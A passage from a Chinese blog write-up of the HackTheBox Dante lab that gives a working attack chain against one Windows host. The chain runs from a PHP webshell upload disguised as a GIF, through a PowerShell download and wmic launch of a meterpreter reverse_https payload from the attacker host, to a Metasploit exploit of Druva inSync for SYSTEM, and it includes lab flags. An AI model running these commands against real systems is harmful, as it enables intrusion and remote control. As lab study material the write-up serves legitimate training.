+<p><img src="/img/htb/htb-dante-136.png"></p>
+<p>上传111.php getshell</p>
+<p>rce了，先拿个flag</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-137.png"></p>
+<p>flag22:DANTE{l355_t4lk_m04r_l15tening}</p>
+<p>但是一直谈不上shell</p>
+<p>cve：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-138.png"></p>
+<p><font style="color:#DF2A3F;background-color:#FBDE28;">DANTE-WS01 (172.16.1.13) GetShell （agent帮忙整理）</font><br>步骤1：注册用户上传webshell<br>discuss论坛有历史漏洞——注册时头像上传可传PHP马。exec&#x2F;system都不可fork，用无fork命令直接写：</p>
+<p>1.1 注册并上传webshell（通过代理，Python脚本或直接curl）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl -s -X POST &#x27;http://172.16.1.13/discuss/registerH.php&#x27; </span><br><span class="line">-F &#x27;un=pwn123&#x27; -F &#x27;fn=pwn123&#x27; -F &#x27;pwd=pwned123&#x27; </span><br><span class="line">-F &#x27;e_mail=pwn123@test.com&#x27; -F &#x27;gender=1&#x27; -F &#x27;dob=1990-01-01&#x27; </span><br><span class="line">-F &#x27;add=test&#x27; -F &#x27;country=USA&#x27; -F &#x27;state=TX&#x27; -F &#x27;user_type=user&#x27; </span><br><span class="line">-F &#x27;ima=@shell.php;type=image/gif&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:#DF2A3F;">webshell内容（GIF header绕过检查）</font>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php if(isset($_GET[&quot;c&quot;]))&#123;echo exec($_GET[&quot;c&quot;]);&#125;else&#123;echo&quot;X&quot;;&#125; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>→ PHP file + GIF header &#x3D; antivirus lets it through</p>
+<p>注册后文件在 &#x2F;discuss&#x2F;ups&#x2F; 目录下。</p>
+<p>步骤2：发现exec&#x2F;system不能fork<br>exec&#x2F;system都返回”Unable to fork”——PHP配置限制。但可以执行不分叉的PHP代码。</p>
+<p>步骤3：写入system()版shell绕过验证</p>
+<p> 通过exec写入新shell（echo &gt;&gt; 不需要fork）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl -s --get &#x27;http://172.16.1.13/discuss/ups/x.php&#x27; \</span><br><span class="line">  --data-urlencode &#x27;c=echo ^&lt;?php echo system($_GET[&quot;c&quot;]); ?^&gt; &gt; C:\xampp\htdocs\discuss\ups\s.php&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>s.php使用system()而非exec()，能执行大部分命令但后台进程仍然受限。</p>
+<p>步骤4：通过WMIC创建独立进程执行payload<br>system虽不能fork但可写文件、用wmic启动独立进程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 4.1 生成MSF https payload</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.16.59 LPORT=8443 -f exe -o /tmp/msf_https.exe</span><br><span class="line"></span><br><span class="line"># 4.2 Kali开HTTP服务</span><br><span class="line">cd /tmp &amp;&amp; python3 -m http.server 7780 &amp;</span><br><span class="line"></span><br><span class="line"># 4.3 通过s.php PowerShell下载（iwr不需要fork）</span><br><span class="line">proxychains curl -s --get &#x27;http://172.16.1.13/discuss/ups/s.php&#x27; \</span><br><span class="line">  --data-urlencode &#x27;c=powershell -c iwr http://10.10.16.59:7780/msf_https.exe -OutFile C:\Windows\Temp\m.exe&#x27; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"># 4.4 WMIC启动payload（独立进程，不依赖PHP fork）</span><br><span class="line">proxychains curl -s --get &#x27;http://172.16.1.13/discuss/ups/s.php&#x27; \</span><br><span class="line">  --data-urlencode &#x27;c=wmic process call create C:\Windows\Temp\m.exe&#x27; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"># 4.5 Kali MSF监听</span><br><span class="line">msfconsole -q -x &quot;use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.16.59; set LPORT 8443; set ExitOnSession false; run -j&quot;</span><br></pre></td></tr></table></figure>
+
+<p>完整链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">discuss论坛注册 → 头像上传PHP马(GIF header) → /ups/目录</span><br><span class="line">  → exec webshell(x.php) → echo写入system() shell(s.php)</span><br><span class="line">  → PowerShell下载MSF payload → WMIC独立进程执行</span><br><span class="line">  → meterpreter reverse_https → dante-ws01\gerald</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-139.png"></p>
+<p>提权：</p>
+<p>在C:\Program Files (x86)\目录下发现Druva( 云端备份、勒索病毒防护、数据恢复工具）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,pathname,startname | findstr /i &quot;druva&quot;</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<p>inSyncCPHService  “C:\Program Files (x86)\Druva\inSync\inSyncCPHwnet64.exe”  <font style="color:#DF2A3F;">LocalSystem</font>， 发现Druva以LocalSystem运行</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-140.png"></p>
+<p>版本是6.6.3，找漏洞</p>
+<p>msf有exp</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-141.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line">set SESSION 1</span><br><span class="line">set LHOST 10.10.16.59</span><br><span class="line">set LPORT 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-142.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-143.png"></p>
+<p>flag23:DANTE{Bad_pr4ct1ces_Thru_strncmp}</p>
+<hr>
+<blockquote>
+<p>2026.7.19完——Echoin</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://github.com/Echoin-613">Echoin</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://echoin.xyz/2026/08/24/htb-dante/">https://echoin.xyz/2026/08/24/htb-dante/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://echoin.xyz" target="_blank">Echoin 的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a><a class="post-meta__tags" href="/tags/HTB/">HTB</a><a class="post-meta__tags" href="/tags/Dante/">Dante</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="/pluginsSrc/butterfly-extsrc/sharejs/dist/css/share.min.css?v=1.1.6" media="print" onload="this.media='all'"><script src="/pluginsSrc/butterfly-extsrc/sharejs/dist/js/social-share.min.js?v=1.1.6" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/08/24/ssrf/" title="SSRF（服务端请求伪造）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">SSRF（服务端请求伪造）</div></div><div class="info-2"><div class="info-item-1">SSRF（Server-Side Request Forgery，服务器端请求伪造） 是一种由攻击者构造请求并由服务端发起的安全漏洞。由于请求源自服务器本身，因此可访问外网无法直接触达的 内网系统、本地服务 等敏感资源。 形成原因 多数源于服务端提供了从其他服务器获取数据的功能（如加载图片、抓取网页、下载文件等），但 未对目标地址、协议、端口进行严格限制。攻击者可控制URL参数，让服务器充当“代理”访问任意资源。 1. 一句话本质服务器替攻击者发起请求，攻击者借服务端的网络身份访问内网&#x2F;本地服务，绕过网络边界限制。 为什么成立？ 服务端有访问内网的权限（防火墙只防外部，不防内部） 请求的 URL 由用户控制 服务端没有严格校验 URL 的目标地址 攻击者可以让服务端请求内网 IP、本地端口、云元数据等  核心条件 ✅ 服务端会发起 HTTP&#x2F;网络请求 ✅ 请求的 URL 或参数用户可控 ✅ 没有严格的协议&#x2F;域名&#x2F;IP 校验   2. 代码特征（看到 &#x3D; 有洞）各语言危险函数   语言 危险函数&#x2F;库    PHP curl...</div></div></div></a><a class="pagination-related" href="/2026/08/24/kerberos-bronze-bit/" title="攻击方式 - Kerberos Bronze Bit"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">攻击方式 - Kerberos Bronze Bit</div></div><div class="info-2"><div class="info-item-1">定义: Kerberos Bronze Bit攻击（CVE-2020-17049）是针对Kerberos协议中约束委派与基于资源的约束委派（RBCD）的一种安全功能绕过漏洞。它允许攻击者篡改服务票据（ST）的Forwardable标志位，从而突破”敏感账户禁止被委派”等安全限制。 核心原理：  在Kerberos约束委派中，如果目标用户被标记为”不能被委派”或属于Protected Users组，KDC会签发不可转发的ST（Forwardable&#x3D;0），阻止S4U2Proxy获取其他服务票据。  漏洞在于：ST是用服务密钥加密的，Forwardable标志位不在PAC中，服务端可自行解密ST、修改该标志为1，再重新加密并提交给KDC。由于KDC无法检测该位是否被篡改，攻击者即可绕过限制，继续发起S4U2Proxy请求获取任意服务的ST。 攻击条件： 拥有服务账户的密码哈希    该服务配置了 约束委派 &#x2F; RBCD委派     服务账户哈希的获取方式：Kerberoasting、DCSync、创建机器账户（Powermad）等。    实战场景：场景 1：绕过...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/08/30/htb-devhub/" title="HTB DevHub 靶场 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-30</div><div class="info-item-2">HTB DevHub 靶场 Writeup</div></div><div class="info-2"><div class="info-item-1">浏览器访问ip-&gt;域名devhub.htb 域名写入主机： 110.129.245.216 devhub.htb  nmap12345678910111213141516171819202122232425262728293031┌──(echoin㉿kali)-[~]└─$ nmap -sC -sV 10.129.245.216 -A              Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-30 14:59 CSTNmap scan report for 10.129.245.216Host is up (0.46s latency).Not shown: 998 filtered tcp ports (no-response)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 35:78:...</div></div></div></a><a class="pagination-related" href="/2026/08/24/htb-facts/" title="HTB Facts 靶场 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-24</div><div class="info-item-2">HTB Facts 靶场 Writeup</div></div><div class="info-2"><div class="info-item-1">Nmap将机器主机名添加到本地主机文件中： 1echo &quot;10.129.244.96 facts.htb&quot; | sudo tee -a /etc/hosts  10.129.244.96  扫端口：  目录扫描： 1feroxbuster -u http://facts.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   扫到：http://facts.htb/admin/login   随意注册登录：   登录后发现CMS版本  CMS在用户这里可以修改密码  抓包：  改成admin  再次登录即可进入到管理员界面  CVE-2024-46987Camaleon CMS 认证任意文件读取 Goultarde&#x2F;CVE-2024-46987: This Python PoC exploits CVE-2024-46987, a Path Traversal bug in Camaleon CMS 2.8.0 &lt; 2.8.2 (work on 2.9.0)....</div></div></div></a><a class="pagination-related" href="/2026/08/24/htb-conversor/" title="HTB Conversor 靶场 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-24</div><div class="info-item-2">HTB Conversor 靶场 Writeup</div></div><div class="info-2"><div class="info-item-1">Nmap1nmap -sV 10.129.238.31  22,80 将机器主机名添加到本地主机文件中： 1echo &quot;10.129.238.31 conversor.htb&quot; | sudo tee -a /etc/hosts  10.129.238.31  注册登录之后进入   下载源码后： tar -xvf source_code.tar.gz 解压 install.md:   每分钟执行&#x2F;var&#x2F;www&#x2F;conversor.htb&#x2F;scripts 下的py文件 XSLT 注入利用xlst的EXSLT拓展往这个目录下写py脚本弹shell  EXSLT，即可扩展样式表语言转换，是对XSLT（可扩展样式表语言转换）语言的一组扩展。EXSLT，即可扩展样式表语言转换，是对XSLT（可扩展样式表语言转换）语言的一组扩展。  参考：https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/#write-files-with-exslt-extens...</div></div></div></a><a class="pagination-related" href="/2026/08/24/htb-wingdata/" title="HTB WingData 靶场 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-24</div><div class="info-item-2">HTB WingData 靶场 Writeup</div></div><div class="info-2"><div class="info-item-1">Nmap1nmap -sV 10.129.244.106   22,80 将机器主机名添加到本地主机文件中： 1echo &quot;10.129.244.106 wingdata.htb&quot; | sudo tee -a /etc/hosts  10.129.244.106  点击Client Portal   发现跳转到一个子域名ftp.wingdata.htb 把这个域名加到本地 1echo &quot;10.129.244.106 ftp.wingdata.htb&quot; | sudo tee -a /etc/hosts   这里复习了一下找子域名工具：Sublist3r，kali自带（这里不用）  进入到一个登录页面：  找一下cve： [CVE-2025-47812] Wing FTP Server v7.4.3 Wing FTP 服务器存在未经身份验证的远程代码执行漏洞 [CVE-2025-47812] 漏洞描述 ： &#x2F;loginok.html端点中不正确的 NULL 字节处理 允许通过 Lua 注入进行未经身份验证的远程代码执行  Lua注入漏...</div></div></div></a><a class="pagination-related" href="/2026/08/24/htb-kobold/" title="HTB Kobold 靶场 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-24</div><div class="info-item-2">HTB Kobold 靶场 Writeup</div></div><div class="info-2"><div class="info-item-1">Nmap1nmap -sV 10.129.127.169 -A    3个开放端口：SSH （22）、HTTP（80，重定向为HTTPS）、HTTPS （443） Ubuntu 上的 nginx 1.24.0 通配符TLS证书——表示带有子域名的虚拟主机路由*.kobold.htb 80号端口重定向至https://kobold.htb/  (将机器主机名添加到本地主机文件中： 1echo &quot;10.129.127.169 kobold.htb mcp.kobold.htb bin.kobold.htb&quot; | sudo tee -a /etc/hosts  10.129.245.50   (一开始因为是https,所以证书不受信任，在 Firefox 里点 Advanced 后继续访问)  子域枚举1234ffuf -c -k -u &#x27;https://10.129.127.169/&#x27; \-H &#x27;Host: FUZZ.target.htb&#x27; \-w ~/SecLists/Discovery/DNS/combined_subd...</div></div></div></a><a class="pagination-related" href="/2026/08/30/dcsync-attack/" title="攻击方式 - 滥用 DCsync"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-30</div><div class="info-item-2">攻击方式 - 滥用 DCsync</div></div><div class="info-2"><div class="info-item-1">滥用DCsync：定义： 攻击者模拟另一台域控，滥用域控之间的目录复制协议，远程向域控请求复制域内账号密码哈希，无需登录域控、不用读取 NTDS.dit 文件，即可导出全部域用户 NTLM 哈希。   工作原理:  在网络中发现域控 利用 目录复制服务 的GetNCChanges接口向域控发起数据同步请求 域控把域内账号密码哈希等敏感数据作为复制数据返回攻击者，完成哈希窃取  攻击条件： 有DCsync权限的用户 或者可修改DCsync的ACL的用户    默认：域管理员、域控机器账号自带 DCSync 权限。普通账号被误授予这两条权限即可直接执行攻击。    实战场景： 拿到域内账号，枚举 ACL 发现账号具备 DCSync 复制权限，直接 dump 域内全部 hash，不用横向移动到域控主机。 获取拥有WriteDacl权限账号，给当前账号添加 DCSync 权限，做域内持久化，后续随时导出哈希。 内网拿到一台普通机器权限，账号有复制权限，直接远程导出域管哈希，完成域控接管。 红队后渗透，需要批量拿到域内所有用户凭据时优先考虑 DCSync。  攻击过程：1️⃣查找&#x2F...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Echoin</div><div class="author-info-description">Web安全 · 渗透测试 · CTF · 靶场</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">69</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Echoin-613"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Echoin-613" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #8b7cf6;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的安全博客，一起学习 Web 安全与渗透测试！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux-10-10-110-100"><span class="toc-number">1.</span> <span class="toc-text">linux:10.10.110.100</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#fscan%EF%BC%88%E9%83%A8%E5%88%86%E4%B8%BB%E6%9C%BA%E5%90%8D%E6%9D%A5%E8%87%AA%E5%90%8E%E9%9D%A2%E7%9A%84%E8%A1%A5%E5%85%85%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">fscan（部分主机名来自后面的补充）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-172-16-1-10"><span class="toc-number">2.</span> <span class="toc-text">Linux: 172.16.1.10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-172-16-1-17"><span class="toc-number">3.</span> <span class="toc-text">Linux:172.16.1.17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-DC01-%E5%9F%9F%E6%8E%A7-172-16-1-20"><span class="toc-number">4.</span> <span class="toc-text">Windows DC01 域控 :172.16.1.20</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-DC02-172-16-2-5"><span class="toc-number">5.</span> <span class="toc-text">Windows DC02:172.16.2.5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-172-16-2-101"><span class="toc-number">6.</span> <span class="toc-text">Linux:172.16.2.101</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-172-16-2-6"><span class="toc-number">7.</span> <span class="toc-text">Linux:172.16.2.6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%EF%BC%9A172-16-1-101"><span class="toc-number">8.</span> <span class="toc-text">Windows：172.16.1.101</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-172-16-1-5"><span class="toc-number">9.</span> <span class="toc-text">windows:172.16.1.5  </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%EF%BC%9A172-16-1-12"><span class="toc-number">10.</span> <span class="toc-text">Linux：172.16.1.12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-172-16-1-102"><span class="toc-number">11.</span> <span class="toc-text">Windows: 172.16.1.102</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%EF%BC%9A172-16-1-19"><span class="toc-number">12.</span> <span class="toc-text">Linux：172.16.1.19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%EF%BC%9A172-16-1-13"><span class="toc-number">13.</span> <span class="toc-text">Windows ：172.16.1.13</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/30/dcsync-attack/" title="攻击方式 - 滥用 DCsync">攻击方式 - 滥用 DCsync</a><time datetime="2026-08-30T13:00:00.000Z" title="发表于 2026-08-30 21:00:00">2026-08-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/30/htb-devhub/" title="HTB DevHub 靶场 Writeup">HTB DevHub 靶场 Writeup</a><time datetime="2026-08-30T12:10:00.000Z" title="发表于 2026-08-30 20:10:00">2026-08-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/24/ctf-mlops-ssrf-hardlink/" title="mlops - URL解析差异SSRF + hardlink恢复缺陷 + 配置文件注入">mlops - URL解析差异SSRF + hardlink恢复缺陷 + 配置文件注入</a><time datetime="2026-08-24T15:30:00.000Z" title="发表于 2026-08-24 23:30:00">2026-08-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/24/ctf-go-to-php-http-smuggling/" title="go to php - HTTP 请求走私">go to php - HTTP 请求走私</a><time datetime="2026-08-24T15:15:00.000Z" title="发表于 2026-08-24 23:15:00">2026-08-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/24/ctf-stored-xss-admin-bot/" title="存储型 XSS 注入 + Admin Bot 提权 + XSS 外带">存储型 XSS 注入 + Admin Bot 提权 + XSS 外带</a><time datetime="2026-08-24T15:00:00.000Z" title="发表于 2026-08-24 23:00:00">2026-08-24</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Echoin</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.0"></script><script src="/js/main.js?v=5.7.0"></script><div class="js-pjax"></div><script src="/js/cursor.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="/pluginsSrc/butterfly-extsrc/dist/fireworks.min.js?v=1.1.6"></script><script id="canvas_nest" defer="defer" color="167,139,250" opacity="0.6" zIndex="-1" count="99" mobile="false" src="/pluginsSrc/butterfly-extsrc/dist/canvas-nest.min.js?v=1.1.6"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.7.0"></script></div></div></body></html>
